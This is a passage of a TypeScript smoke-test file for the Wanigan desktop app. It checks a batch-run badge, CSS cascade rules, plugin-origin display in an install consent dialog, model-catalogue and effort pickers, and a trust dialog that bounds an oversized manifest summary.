  // send an IPC message, so these read the source. Every one of them was dead
  // wiring with a caller already waiting on it, which is the failure that hides
  // best: a channel nobody registered looks exactly like a feature nobody used.
  say('── wiring');

  say('── the batch badge counts runs, not requests');
  const flightRunId = `badge-in-flight-${Date.now()}`;
  try {
    db().prepare(`
      INSERT INTO runs (id, name, preset, project_id, model, status, config_json, kind,
                        total_requests, created_at, submitted_at)
      VALUES (?, 'badge fixture', NULL, NULL, 'test', 'in_progress', '{}', 'batch', 3, ?, ?)
    `).run(flightRunId, Date.now(), Date.now());
    const seedReq = db().prepare(`
      INSERT INTO requests (run_id, custom_id, row_index, row_json, rendered, status)
      VALUES (?, ?, ?, '{}', 'x', ?)
    `);
    seedReq.run(flightRunId, 'a', 0, 'succeeded');
    seedReq.run(flightRunId, 'b', 1, 'errored');
    seedReq.run(flightRunId, 'c', 2, 'pending');

    const before = batch.runsInFlight();
    check(before.runs >= 1
      && before.requestsReturned >= 2 && before.requestsOutstanding >= 1
      && before.readAt > 0,
      'the badge query answers how many runs are in flight and how many of their requests have come back, in one row, so the shell never reads two hundred whole run rows to print one integer',
      before);

    const withRun = batch.runsInFlight();
    db().prepare("UPDATE runs SET status='ended', ended_at=? WHERE id=?").run(Date.now(), flightRunId);
    const ended = batch.runsInFlight();
    check(ended.runs === withRun.runs - 1
      && ended.requestsReturned === withRun.requestsReturned - 2
      && ended.requestsOutstanding === withRun.requestsOutstanding - 1,
      'a run that has ended stops being counted, and takes its three requests out of the bar with it — the badge is a statement about what is still in flight, not a lifetime total',
      { withRun, ended });

    // The negative. A bare integer cannot say "nobody has asked yet", so the
    // wire carries an object whose absence is the renderer's only zero.
    const shape = batch.runsInFlight();
    check(typeof shape === 'object' && shape !== null
      && typeof shape.runs === 'number' && typeof shape.readAt === 'number'
      && !Array.isArray(shape),
      'the badge read is an object and never a bare number, so "no read has returned yet" stays tellable from "nothing is in flight" — a zero on the wire is an observation, and the renderer supplies the missing case as null',
      shape);

    db().prepare("UPDATE runs SET status='canceling' WHERE id=?").run(flightRunId);
    check(batch.runsInFlight().runs === withRun.runs,
      'a run cancelled locally but not yet stopped remotely is still in flight, because it may still be spending — the badge counts the same three statuses deleteRun refuses to delete',
      batch.runsInFlight().runs);
  } finally {
    db().prepare('DELETE FROM requests WHERE run_id = ?').run(flightRunId);
    db().prepare('DELETE FROM runs WHERE id = ?').run(flightRunId);
  }

  /* ── the style gate scores the sheets index.css imports ────────────── */
  // A private modifier in an @imported sheet loses to index.css at equal
  // specificity, because @import must precede every other rule in a sheet.
  // Check 5 of the style gate counts those dead declarations; the gate cannot
  // check its own premise, and a baseline edit re-opens the debt without
  // touching a single sheet.
  const shadowGateSrc = sourceOf('scripts/check-renderer-style.cjs');
  const shadowIndexCss = sourceOf('src/renderer/src/index.css').replace(/\/\*[\s\S]*?\*\//g, '');
  const shadowMainTsx = sourceOf('src/renderer/src/main.tsx');
  const shadowBaselineStart = shadowGateSrc.indexOf('const SHADOWED_MODIFIER_BASELINE = {');
  const shadowBaselineBlock = shadowGateSrc.slice(shadowBaselineStart, shadowGateSrc.indexOf('};', shadowBaselineStart));
  const shadowRows = [...shadowBaselineBlock.matchAll(/'([a-z0-9-]+\.css)': (\d+),/g)]
    .map((m) => ({ sheet: m[1], allowed: Number(m[2]) }));
  const shadowImported = [...shadowIndexCss.matchAll(/@import\s+'\.\/styles\/([a-z0-9-]+\.css)'/g)].map((m) => m[1]);
  const shadowLastImportEnd = shadowIndexCss.indexOf(';', shadowIndexCss.lastIndexOf('@import')) + 1;

  check(shadowImported.length === 14 && shadowLastImportEnd > 1
    && !shadowIndexCss.slice(0, shadowLastImportEnd).includes('{'),
  'index.css states every one of its fourteen @import lines before it opens a single rule of its own, which is the fact that makes a declaration in an imported sheet lose to index.css at equal specificity and makes the style gate fifth check sound rather than a guess about bundler order',
  `imported sheets: ${shadowImported.length}, last @import ends at char ${shadowLastImportEnd}, braces before it: ${shadowIndexCss.slice(0, shadowLastImportEnd).split('{').length - 1}`);

  const shadowStrays = shadowRows.filter((r) => !shadowImported.includes(r.sheet)).map((r) => r.sheet);
  check(shadowRows.length === shadowImported.length && shadowStrays.length === 0,
  'every sheet the shadowed-modifier baseline grants a budget to is a sheet index.css actually imports, so a renamed or un-imported sheet cannot keep a stale allowance that the gate would then never spend',
  `baseline rows: ${shadowRows.length}, imported sheets: ${shadowImported.length}, rows naming a sheet index.css does not import: ${shadowStrays.join(', ') || 'none'}`);

  const shadowCeiling = shadowRows.reduce((a, r) => a + r.allowed, 0);
  check(shadowRows.length > 0 && shadowCeiling === 0,
  'every one of the sixteen dead declarations this check found the day it landed has been paid off and the baseline is zero across all fourteen sheets, so there is no unspent allowance left for a new private modifier to hide inside and a sheet cannot buy itself room by editing the gate instead of the CSS',
  `baseline total: ${shadowCeiling} across ${shadowRows.length} sheets, ceiling: 0`);

  check(!shadowRows.some((r) => r.sheet === 'compact.css')
    && shadowMainTsx.indexOf("'./styles/compact.css'") > shadowMainTsx.indexOf("'./index.css'"),
  'compact.css is absent from the shadowed-modifier baseline because main.tsx loads it after index.css, which means it wins the cascade rather than losing it, and scoring it would report a defect that does not exist',
  `compact.css in baseline: ${shadowRows.some((r) => r.sheet === 'compact.css')}, main.tsx index.css at ${shadowMainTsx.indexOf("'./index.css'")}, compact.css at ${shadowMainTsx.indexOf("'./styles/compact.css'")}`);

  check(shadowGateSrc.includes('--print-shadowed')
    && shadowGateSrc.includes('What it cannot see, so a pass here is not proof')
    && shadowGateSrc.includes('no @import of ./styles/*.css found in index.css'),
  'the style gate names the blind spots of its fifth check in its own source, offers --print-shadowed for the line behind every count, and fails loudly rather than reporting zero if it can no longer find the import list its soundness depends on',
  `gate declares --print-shadowed, the blind-spot list and the empty-import-list guard: ${shadowGateSrc.includes('--print-shadowed') && shadowGateSrc.includes('What it cannot see, so a pass here is not proof') && shadowGateSrc.includes('no @import of ./styles/*.css found in index.css')}`);

  /* ── the sixteen shadowed declarations, and how each was answered ──── */
  // Check 5 of the style gate counts dead declarations; it cannot check that the
  // fix was the right one. Five of the sixteen differed from their base rule, so
  // the selector was compounded to let them apply; the rest were copies of the
  // base or decisions the shared frame owns, and were deleted. A revert of this
  // work looks like a passing gate — the count would still be zero if someone
  // "simplified" .field.gt-filter back to .gt-filter, because a dead rule and a
  // deleted one score the same. These pin the shape, not the count.
  const cascadeRules = (text: string): string => text.replace(/\/\*[\s\S]*?\*\//g, '');
  const CASCADE_COMPOUNDED: Record<string, string> = {
    'src/renderer/src/styles/ui.css': '.field.field-inline {',
    'src/renderer/src/styles/timeline.css': '.field.tl-search {',
    'src/renderer/src/styles/evals.css': '.field.skills-search {',
    'src/renderer/src/styles/git.css': '.field.gt-filter {',
    'src/renderer/src/styles/control.css': '.field.control-textarea {',
    'src/renderer/src/styles/runs.css': '.stat-grid.hr-stats {',
  };
  const cascadeCollapsed = Object.entries(CASCADE_COMPOUNDED)
    .filter(([file, selector]) => !sourceOf(file).includes(selector))
    .map(([file]) => path.basename(file));
  check(cascadeCollapsed.length === 0,
  'every modifier that had to beat a base rule still names both classes in its selector, because a bare .field-inline, .tl-search, .skills-search, .gt-filter, .control-textarea or .hr-stats loses on source order to .field, .stat-grid or .pane and renders nothing at all — which is the state each of these was found in',
  `sheets whose compound selector was collapsed back to one class: ${cascadeCollapsed.join(', ') || 'none'}`);

  // The negative half. A collapsed selector is the likeliest regression here,
  // because a compound modifier reads as redundant to anyone who has not traced
  // the bundle, and deleting the second class is a one-character edit that no
  // type, test or gate would otherwise notice.
  const CASCADE_BARE: [string, string][] = [
    ['ui.css', 'field-inline'], ['timeline.css', 'tl-search'], ['evals.css', 'skills-search'],
    ['git.css', 'gt-filter'], ['control.css', 'control-textarea'], ['runs.css', 'hr-stats'],
  ];
  const cascadeBareBack = CASCADE_BARE
    .filter(([sheet, cls]) => new RegExp(`(^|[\\s,}])\\.${cls}\\s*\\{`)
      .test(cascadeRules(sourceOf(`src/renderer/src/styles/${sheet}`))))
    .map(([sheet, cls]) => `${sheet} .${cls}`);
  check(cascadeBareBack.length === 0,
  'no sheet has re-opened a one-class rule head for any of the six modifiers that need two, so a future edit cannot quietly restore a declaration that loses every value it sets while still reading like working CSS',
  `one-class rule heads found: ${cascadeBareBack.join(', ') || 'none'}`);

  // runs.css is imported from HeadlessRuns.tsx rather than index.css, so the
  // gate refuses to score it and a person has to. Three Stat children were being
  // painted in .stat-grid's four columns, and the 720px step has to be compound
  // as well or compact.css's two-column .stat-grid wins it back.
  const cascadeRuns = sourceOf('src/renderer/src/styles/runs.css');
  const cascadeRunsRules = cascadeRules(cascadeRuns);
  check(cascadeRuns.includes('.stat-grid.hr-stats { margin: var(--s-4) 0; grid-template-columns: repeat(3, minmax(0, 1fr)); }')
    && cascadeRuns.includes('.stat-grid.hr-stats { grid-template-columns: minmax(0, 1fr); }')
    && !/(^|[\s,}])\.hr-view\s*\{/.test(cascadeRunsRules),
  'the Headless Runs stat row asks for three columns at two classes of specificity so it beats .stat-grid at both its own width and the 720px step, and .hr-view opens no rule of its own at all — the surface takes both its vertical rhythm and its two padding steps from .pane, base and compact, rather than private copies that never applied',
  `three-column rule present: ${cascadeRuns.includes('grid-template-columns: repeat(3, minmax(0, 1fr))')}, hr-view rule heads: ${(cascadeRunsRules.match(/(^|[\s,}])\.hr-view\s*\{/g) ?? []).length}`);

  // The four deletions. Each was a copy of the base rule's own value or a
  // decision the shared frame owns, so restoring one would put back a
  // declaration that either says nothing or has to defeat compact.css to speak.
  const cascadeQueue = cascadeRules(sourceOf('src/renderer/src/styles/queue.css'));
  const cascadeSchedule = cascadeRules(sourceOf('src/renderer/src/styles/schedule.css'));
  const cascadeFleet = cascadeRules(sourceOf('src/renderer/src/styles/fleet.css'));
  check(!/\.fleet-prov \{[^}]*padding/.test(cascadeFleet)
    && !/\.pg-ver \{[^}]*font-family/.test(cascadeQueue)
    && !/\.pg-head\s*\{/.test(cascadeQueue)
    && !/\.sc-head\s*\{/.test(cascadeSchedule),
  'no sheet keeps a private copy of a primitive it already wears — the provider pill takes .pill padding, the plugin version takes the --mono family from the .mono class beside it, and the Plugins and Schedules heads align the way .pane-head aligns every other head instead of overriding a rule compact.css re-states at 720px',
  `fleet-prov padding: ${/\.fleet-prov \{[^}]*padding/.test(cascadeFleet)}, pg-ver font-family: ${/\.pg-ver \{[^}]*font-family/.test(cascadeQueue)}, pg-head rule: ${/\.pg-head\s*\{/.test(cascadeQueue)}, sc-head rule: ${/\.sc-head\s*\{/.test(cascadeSchedule)}`);

  // Raising specificity is not free, and this is the sharpest edge: two classes
  // beat a one-class rule inside a @media block as well, so a compound modifier
  // that names min-height also outranks the coarse-pointer target. The Git
  // history filter is a box a finger has to hit and type into.
  const cascadeGit = cascadeRules(sourceOf('src/renderer/src/styles/git.css'));
  const cascadeCompact = sourceOf('src/renderer/src/styles/compact.css');
  check(!/\.field\.gt-filter \{[^}]*min-height/.test(cascadeGit)
    && cascadeCompact.includes('@media (pointer: coarse)')
    && /\.btn, \.field \{ min-height: 44px; \}/.test(cascadeCompact),
  'the Git history filter declares no height of its own, so compact.css can still raise every .field to a 44px target on a coarse pointer — a compound selector would have outranked that media rule and shrunk a typing target to 26px, which is the cost of winning a cascade fight the shared rule was already winning correctly',
  `gt-filter min-height declared: ${/\.field\.gt-filter \{[^}]*min-height/.test(cascadeGit)}, coarse-pointer field target present: ${/\.btn, \.field \{ min-height: 44px; \}/.test(cascadeCompact)}`);

  // The gate's own table. Zero is the floor, not a permit, and a sheet that
  // regrows one of these fails rather than spending an allowance.
  const cascadeGateRows = [...shadowBaselineBlock.matchAll(/'([a-z0-9-]+\.css)': (\d+),/g)]
    .map((m) => ({ sheet: m[1], allowed: Number(m[2]) }));
  check(cascadeGateRows.length === 14 && cascadeGateRows.every((r) => r.allowed === 0),
  'the shadowed-modifier baseline still lists all fourteen imported sheets and grants none of them a single dead declaration, so the debt this check measured cannot be re-opened one sheet at a time by editing the gate instead of the CSS',
  `rows: ${cascadeGateRows.length}, sheets still holding an allowance: ${cascadeGateRows.filter((r) => r.allowed > 0).map((r) => `${r.sheet}=${r.allowed}`).join(', ') || 'none'}`);

  // A catalog row is an offer, and accepting one runs code on this machine, so
  // the consent screen has to be able to name the origin. Three shapes are real
  // in the marketplace manifest and in `claude plugin list --json --available`:
  // a whole repository, one directory of one, and a path inside the marketplace
  // itself. The third is what almost every cloned row actually is, and calling
  // it a remote would be the comfortable lie.
  const srcWholeRepo = plugins.readSource({ source: 'url', url: 'https://example.invalid/p.git', sha: 'abc123' });
  const srcSubdir = plugins.readSource({ source: 'git-subdir', url: 'https://example.invalid/p.git', path: 'plugins/one', ref: 'v1.5.5', sha: 'abc123' });
  const srcInMarket = plugins.readSource('./plugins/one');
  check(srcWholeRepo?.origin === 'https://example.invalid/p.git' && srcWholeRepo.local === false && srcWholeRepo.pinned === 'abc123'
    && srcSubdir?.subpath === 'plugins/one' && srcSubdir.pinned === 'v1.5.5' && srcSubdir.local === false
    && srcInMarket?.origin === './plugins/one' && srcInMarket.local === true && srcInMarket.subpath === null,
    'a plugin source reads back as the origin the metadata actually records — a repository, one directory of one with its pinned ref, or a path inside the marketplace checkout that is not reported as a remote',
    { whole: srcWholeRepo, subdir: srcSubdir, inMarket: srcInMarket });

  // The negative that matters. An unknown origin is a stronger reason to
  // hesitate than a known one, so a row with nothing recorded must resolve to
  // null and reach the screen as a sentence — never as a blank, and never
  // backfilled from the marketplace's own address, which is not the plugin's.
  // `repo` is the marketplace key: reading it alone resolved 0 of 282 real CLI
  // rows while looking like it worked.
  check(plugins.readSource(undefined) === null
    && plugins.readSource(null) === null
    && plugins.readSource({}) === null
    && plugins.readSource('   ') === null
    && plugins.readSource(['https://example.invalid/p.git']) === null
    && plugins.readSource({ source: 'github', repo: 'owner/name' })?.origin === 'owner/name',
    'an unrecorded plugin source stays null instead of being invented from the marketplace, an array or a blank string, while a record that really does carry a repo is read',
    { missing: plugins.readSource(undefined), empty: plugins.readSource({}), array: plugins.readSource(['x']) });

  // The origin comes from the marketplace's manifest, which is a fact about the
  // offer. A plugin's own plugin.json is self-attested and cannot be the
  // authority on where the plugin came from.
  const pluginsSrc = sourceOf('src/main/plugins.ts');
  check(pluginsSrc.includes("readJson(path.join(MARKETPLACES, mkt, '.claude-plugin', 'marketplace.json'))")
    && pluginsSrc.includes('source: readSource(sources.get(n)),')
    && pluginsSrc.includes('source: readSource(r.source),')
    && pluginsSrc.includes('source: PluginSource | null;')
    && !/\(src as \{ repo\?: unknown \}\)\.repo/.test(pluginsSrc),
    'both catalog readers take a row’s origin from the marketplace manifest through one parser, instead of the plugin’s self-declared manifest or a repo key that no plugin row carries',
    pluginsSrc.split('readSource(').length - 1);

  // Consent is the point. The origin is stated in the dialog that passes -y on
  // the operator’s behalf, not in the "Where this comes from" table below it,
  // and the offline fallback keeps the origin the disk scan read rather than
  // dropping it on the floor.
  const pluginsViewSrc2 = sourceOf('src/renderer/src/views/Plugins.tsx');
  const consentAt = pluginsViewSrc2.indexOf('<strong>Install {confirming.name}?</strong>');
  const originAt = pluginsViewSrc2.indexOf('{origin(confirming.source, confirming.marketplace)}');
  check(consentAt > 0 && originAt > consentAt
    && originAt < pluginsViewSrc2.indexOf('This dialog is that prompt.')
    && pluginsViewSrc2.includes('enabled: false, source: a.source,')
    && !/source: null/.test(pluginsViewSrc2),
    'the plugin’s origin is named inside the install confirmation itself, before the sentence explaining what pressing Install accepts, and the offline catalog row no longer throws away the source the disk scan read',
    { consentAt, originAt });

  // Naming an origin is not a judgement about it. This view must not describe an
  // install as verified, sandboxed or safe — the screen states where code comes
  // from and stops.
  check(!/\b(verified|vetted|sandboxed|is safe|guaranteed)\b/i.test(
      pluginsViewSrc2.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '')),
    'the plugin catalog names an origin without anywhere calling an install verified, vetted, sandboxed or safe',
    (pluginsViewSrc2.match(/\b(verified|vetted|sandboxed|guaranteed)\b/gi) ?? []).length);


  say('── model catalogue · the profile is the contract, the backend is the catalogue');
  const { resolveModelCatalogue } = await import('./launch-choices');

  // A backend with no catalogue endpoint used to offer four bare aliases and a
  // sentence beginning "Wanigan cannot ask". It cannot — but it is not ignorant
  // either: every session it launched recorded the id that session resolved to,
  // and PostModelSwitch records it again on every change. Those ids belong on
  // the list, marked as seen rather than offered.
  const { providerModelCatalogue } = await import('./launch-choices');
  const anthropicProfile = { backendId: 'anthropic', supports: { model: true }, launchFields: [] };
  const before = await providerModelCatalogue(anthropicProfile as never);
  db().prepare(`INSERT INTO session_log (id, conversation_id, provider_id, harness_id, backend_id, model, project_path, project_name, started_at)
                VALUES (?,?,?,?,?,?,?,?,?)`)
    .run('mc-1', 'mc-1', 'claude', 'claude-code', 'anthropic', 'claude-opus-4-6-20260115', '/tmp/mc', 'mc', Date.now() - 5000);
  // Same alias the published list already offers, differently cased: one row.
  db().prepare(`INSERT INTO session_log (id, conversation_id, provider_id, harness_id, backend_id, model, project_path, project_name, started_at)
                VALUES (?,?,?,?,?,?,?,?,?)`)
    .run('mc-2', 'mc-2', 'claude', 'claude-code', 'anthropic', 'Opus', '/tmp/mc', 'mc', Date.now() - 4000);
  // A different backend's id must not leak into this one's picker.
  db().prepare(`INSERT INTO session_log (id, conversation_id, provider_id, harness_id, backend_id, model, project_path, project_name, started_at)
                VALUES (?,?,?,?,?,?,?,?,?)`)
    .run('mc-3', 'mc-3', 'glm', 'claude-code', 'zai', 'glm-5.3', '/tmp/mc', 'mc', Date.now() - 3000);
  const after = await providerModelCatalogue(anthropicProfile as never);
  const values = after.rows.map((r) => r.value);
  check(before.rows.length === 4 && values.length === 5 && values.includes('claude-opus-4-6-20260115'),
    'a resolved id a session actually ran on this backend joins the published aliases',
    JSON.stringify(values));
  check(values.filter((v) => v.toLowerCase() === 'opus').length === 1,
    'and an id that only re-spells an alias it already offers does not become a second row');
  check(!values.includes('glm-5.3'),
    'and another backend’s ids stay out of this backend’s picker');
  check(after.rows.find((r) => r.value === 'claude-opus-4-6-20260115')?.description === 'seen on this backend'
    && after.source === 'published',
    'the observed rows say they were seen rather than offered, and the catalogue still calls itself published');
  check(/actually seen run here/.test(after.note ?? '') && !/actually seen run here/.test(before.note ?? ''),
    'the note stops at “these are the aliases it publishes” only while there is nothing observed to add',
    after.note ?? 'null');
  const openModelField = { supported: true, label: 'Model', required: false, choices: [],
    declared: false, custom: true, defaultValue: '' };
  const liveRows = { rows: [{ value: 'gpt-5.6-sol', label: 'GPT-5.6 Sol', description: 'frontier',
    efforts: ['low', 'high', 'ultra'] }], source: 'live' as const, note: null };
  const openResolved = resolveModelCatalogue(openModelField, liveRows);
  // The dialog's own narrowing, asserted separately because it is the half that
  // used to be missing: the declared contract filtered by the live row.
  const narrowed = ['low', 'medium', 'high', 'xhigh', 'max']
    .filter((value) => (openResolved.rows[0]?.efforts ?? []).includes(value));
  check(openResolved.source === 'live' && openResolved.rows.length === 1
    && openResolved.rows[0].efforts?.join(',') === 'low,high,ultra'
    && narrowed.join(',') === 'low,high',
    'a profile that declares no model list takes its backend catalogue verbatim, and the effort intersection then narrows that live row to what the profile will actually compile — a live catalogue can never widen a declared contract, which is the launch failure "Reasoning effort has an unsupported value." this dialog used to arm',
    narrowed.join(','));

  const declaredModelField = { supported: true, label: 'Model', required: false,
    choices: [{ value: 'pack-a', label: 'Pack A' }, { value: 'pack-b', label: 'Pack B' }, { value: 'pack-c', label: 'Pack C' }],
    declared: true, custom: false, defaultValue: 'pack-a' };
  const packOnly = resolveModelCatalogue(declaredModelField, { rows: [], source: 'none', note: null });
  const superset = resolveModelCatalogue(declaredModelField, { rows: [
    { value: 'pack-a', label: 'Pack A', description: null, efforts: null },
    { value: 'pack-b', label: 'Pack B', description: null, efforts: null },
    { value: 'pack-c', label: 'Pack C', description: null, efforts: null },
    { value: 'not-declared', label: 'Not declared', description: null, efforts: null },
  ], source: 'live' as const, note: null });
  check(packOnly.source === 'declared' && packOnly.rows.map((row) => row.value).join(',') === 'pack-a,pack-b,pack-c'
    && superset.rows.map((row) => row.value).join(',') === 'pack-a,pack-b,pack-c',
    'a pack that declares its own models is launchable with no backend catalogue at all, and a backend reporting a superset of that declaration is narrowed back to it — the declaration is the contract in both directions',
    superset.rows.map((row) => row.value).join(','));

  const disjoint = resolveModelCatalogue(declaredModelField, { rows: [
    { value: 'something-else', label: 'Something else', description: null, efforts: null },
  ], source: 'live' as const, note: null });
  const fallbackNote = 'No Z.ai key yet, so this is Wanigan’s local list.';
  const carried = resolveModelCatalogue(openModelField, { rows: [
    { value: 'glm-5.3', label: 'GLM 5.3', description: null, efforts: null },
  ], source: 'published' as const, note: fallbackNote });
  check(disjoint.rows.map((row) => row.value).join(',') === 'pack-a,pack-b,pack-c'
    && disjoint.note !== null && disjoint.source !== 'live'
    && carried.note === fallbackNote && carried.source !== 'live',
    'an empty intersection is NOT reported as a profile with no models — it falls back to the declared list with a note and stops calling itself live — and a fallback list a fetcher handed back with its own disclosure keeps that sentence rather than passing as a catalogue',
    { disjoint: disjoint.source, carried: carried.note });

  const dialogCatalogueSrc = sourceOf('src/renderer/src/components/NewSessionDialog.tsx');

  const permDialogSrc = sourceOf('src/renderer/src/components/NewSessionDialog.tsx');
  check(permDialogSrc.includes('permissionModeCopy(')
    && !permDialogSrc.includes('PERMISSION_MODE_COPY[')
    && permDialogSrc.includes('copy.known ? copy.label : choice.label')
    && permDialogSrc.includes('the CLI’s own default applies')
    && !/permissionMode === 'claude'|providerId === 'claude' \?/.test(permDialogSrc),
  'the dialog asks the helper rather than indexing the copy table with a value that came from a manifest, keeps a profile’s own naming for a mode Wanigan cannot describe, describes the blank row as a default rather than as an unrecognised mode, and routes none of this by a profile id',
  permDialogSrc.includes('PERMISSION_MODE_COPY['));
  check(dialogCatalogueSrc.includes('window.wanigan.providers.modelCatalogue(')
    && !dialogCatalogueSrc.includes("value: 'glm-5.3'")
    && !dialogCatalogueSrc.includes("value: 'deepseek-v4-pro'")
    && !dialogCatalogueSrc.includes("{ value: 'opus', label: 'opus' }")
    && !dialogCatalogueSrc.includes('window.wanigan.codex.models()')
    && !/zaiBackend|deepseekBackend|fallbackModels/.test(dialogCatalogueSrc),
    'the New session dialog holds no model catalogue of its own and no backend-id ladder choosing between four of them; it reads one channel and renders what main already resolved',
    dialogCatalogueSrc.includes('window.wanigan.providers.modelCatalogue('));

  // A distinct name on purpose. smoke3 already binds this same file to
  // `sessionsSrc` at :4877 and `sessionsViewSrc` at :5709, both inside
  // runPhaseSmoke2 — so reusing `sessionsSrc` here would read a const
  // declared further down and throw on the temporal dead zone.
  const runBarSrc = sourceOf('src/renderer/src/views/Sessions.tsx');

  // Negative, and the one that fails if this phase is ever reverted or
  // dropped: the constant table and the id short-circuit are what the shared
  // catalogue exists to replace, and neither name appears anywhere in the
  // file, prose included.
  check(!runBarSrc.includes('const MODEL_CHOICES')
    && !runBarSrc.includes("provider.id !== 'glm'")
    && !runBarSrc.includes('window.wanigan.key.glmModels(')
    && !runBarSrc.includes('EFFORT_LEVELS')
    && runBarSrc.includes('window.wanigan.providers.modelCatalogue(session.providerId)'),
    'the picker on a running session holds no catalogue of its own, keeps no short-circuit that made one built-in profile the only route to a live read, and reaches every backend — DeepSeek included — through the one channel main already answers',
    runBarSrc.includes('const MODEL_CHOICES'));

  check(runBarSrc.includes('const frozen = session.providerProfile ?? null;')
    && runBarSrc.includes("launchFieldChoices(launched, 'model')")
    && runBarSrc.includes("launchFieldChoices(launched, 'effort')")
    && runBarSrc.includes('const launchedBackend = session.backendId ?? frozen?.backendId ?? null;')
    && !runBarSrc.includes("launchFieldChoices(provider, 'effort')"),
    'a running session reads its model field and its effort scale from the profile snapshot frozen at launch rather than from whatever that profile id resolves to now, and refuses a catalogue read once the id names a different backend than the one it launched against',
    runBarSrc.includes('const launched = frozen ?? provider ?? null;'));

  check(runBarSrc.includes("CATALOGUE_MARK[shown ? shown.source : 'reading']")
    && runBarSrc.includes('disabled={!shown}')
    && runBarSrc.includes('That is not the same as this profile having none.')
    && runBarSrc.includes('shown?.note')
    && runBarSrc.includes('Typed into the session as a slash command. /model also sets your default')
    && !runBarSrc.includes('models.length > 0'),
    'the running-session picker names the provenance of the list it is showing as a glyph and a word, prints whatever note that read carried instead of letting a published fallback pass as the backend’s answer, keeps saying that these controls type a slash command into the session even when a note is present, says that nothing could be established rather than drawing no models, and holds a disabled reading state until the read returns rather than treating an unanswered read as an empty catalogue',
    runBarSrc.includes("CATALOGUE_MARK[shown ? shown.source : 'reading']"));

  check(runBarSrc.includes('const levels = effortField.choices.map((choice) => choice.value);')
    && runBarSrc.includes('max={levels.length - 1}')
    && runBarSrc.includes('setEffortIdx((i) => Math.max(0, Math.min(i, levels.length - 1)));')
    && runBarSrc.includes("const showEffort = effortField.supported && levels.length > 0;")
    && !runBarSrc.includes('EFFORT_LEVELS[effortIdx]'),
    'the effort slider’s scale is the list the session’s own profile declares, the held index is clamped back into range whenever that list changes so an out-of-range notch can never send an undefined level, and a profile that declares no effort field draws no slider at all',
    runBarSrc.includes('EFFORT_LEVELS[effortIdx]'));

  const effortDialogSrc = sourceOf('src/renderer/src/components/NewSessionDialog.tsx');
  check(effortDialogSrc.includes("...(effortField.required ? [] : [{ value: '', label: 'default' }])")
    && !effortDialogSrc.includes("{[{ value: '', label: 'default' }, ...effortChoices"),
    'the effort picker offers its "default" row only where the profile leaves the field optional — the same guard the model picker above it and withCliDefault on the phone both already keep — because an unconditional row arms a launch the profile’s own compiler refuses with "Effort is required."',
    effortDialogSrc.includes("...(effortField.required ? [] : [{ value: '', label: 'default' }])"));
  check(effortDialogSrc.includes("{effortField.required && effort === '' && (")
    && effortDialogSrc.includes('This profile requires an effort level, and nothing is chosen yet.')
    && !/Wanigan passes no effort flag/.test(effortDialogSrc),
    'and where that row is gone the form says nothing is chosen yet rather than leaving a selection-less pill row, and never claims a flag is being omitted for a field the profile requires',
    effortDialogSrc.includes("{effortField.required && effort === '' && ("));
  check(!effortDialogSrc.includes('Claude permission and effort fields do not apply to it')
    && effortDialogSrc.includes('{effortField.supported && (effortField.declared')
    && effortDialogSrc.includes('? (permissionField.declared')
    && !/So is the permission mode below\.|and Codex takes it/.test(effortDialogSrc),
    'the Codex explainer no longer says Claude’s effort field does not apply to Codex, and each clause reads both facts its picker renders from — whether the profile takes the field, and whether the control shows the profile’s declaration or Wanigan’s fallback — so a profile that declares a field but names no values is never told its own declaration is on screen, and neither clause claims an argv the renderer is never handed',
    effortDialogSrc.includes('and Codex takes it'));
  check(/\{permissionField\.required\s*\n\s*\? <option value="" disabled>Required by provider<\/option>/.test(effortDialogSrc)
    && effortDialogSrc.includes(': <option value="">default</option>}'),
    'the permission select offers its "default" row only where the profile leaves the field optional; where the profile requires a mode the row is a disabled placeholder, because the empty value is the one fieldArgs refuses with "Permission mode is required." — the same guard the effort pills and the model picker above already keep',
    /<option value="" disabled>/.test(effortDialogSrc));

  const mainIndexSrc = sourceOf('src/main/index.ts');
  check(!mainIndexSrc.includes('CODEX_MODELS_MAX_BYTES')
    && !mainIndexSrc.includes("from 'node:child_process'")
    && sourceOf('src/preload/index.ts').includes('providers:modelCatalogue'),
    'Wanigan runs one Codex model probe rather than two — the private four-second copy in index.ts is gone and the ten-minute cached app-server read in codex-status.ts is the only one left — and the catalogue reaches the window through a typed preload binding rather than a renderer-side guess',
    mainIndexSrc.includes('CODEX_MODELS_MAX_BYTES'));
  const mainSrc = sourceOf('src/main/index.ts');

  // A manifest is untrusted data and the consent dialog is the surface that
  // survives a compromised renderer, so the dialog builds its own summary and
  // bounds every part of it. This pack declares one hundred environment
  // destinations whose names are four thousand characters each — the padding
  // attack sessions.ts already warns about. Note what is asserted: not that the
  // text was truncated (it is not; the caps do their job long before the 2,000
  // character bound) but that the count is honest. Ninety-nine of these names
  // clip to the same sixty-four characters, so a summary that de-duplicated
  // rendered lines would show two entries and hide ninety-eight.
  const paddedEnv: Record<string, { source: 'literal'; value: string }> = {
    HOME: { source: 'literal', value: '/tmp/packhome' },
  };
  for (let i = 0; i < 99; i++) paddedEnv[`${'A'.repeat(4000)}${i}`] = { source: 'literal', value: 'x' };
  const hostilePack = {
    id: 'orbit.pack', label: 'Orbit', version: '1.0.0', source: 'local' as const,
    sourcePath: '/packs/orbit.pack/provider-pack.json',
    manifestSha256: 'a'.repeat(64), trustedManifestSha256: null,
    adapterSha256: null, trustedAdapterSha256: null,
    status: 'needs-trust' as const, enabled: false, errors: [],
    pendingActiveProfileIds: [], removedAt: null, recoverable: false,
    manifest: {
      schemaVersion: 1 as const, id: 'orbit.pack', label: 'Orbit', version: '1.0.0',
      profiles: [{
        id: 'orbit.main', label: 'Orbit', harness: 'generic-cli' as const,
        backend: { id: 'orbit', label: 'Orbit' },
        command: { bin: 'orbit', baseArgs: ['--tty'] },
        environment: paddedEnv,
      }],
    },
  };
  const padded = manifestTrustPrompt(hostilePack as never);
  check(padded.detail.length <= 2000
    && padded.message.length <= 200
    && padded.detail.includes('100 destination(s)')
    && padded.detail.includes('HOME')
    && !padded.detail.includes('A'.repeat(200))
    && padded.detail.includes('/packs/orbit.pack/provider-pack.json'),
    'the trust dialog builds its own bounded summary, so a hundred four-thousand-character environment names cannot pad the question off the screen — and it states the true destination count rather than collapsing the ninety-nine that clip to the same string',
    padded.detail.length);

  // When the body does have to be cut, the part that survives is the part
  // Wanigan wrote. Cutting one long string from the end would have dropped the
  // redirect warning, the adapter note and the closing — so the manifest big
  // enough to overflow the dialog would have been the one whose warnings went
  // missing. Forty profiles with twenty launch fields each forces the cut.
  const wide = {
    ...hostilePack,
    manifest: {
      ...hostilePack.manifest,
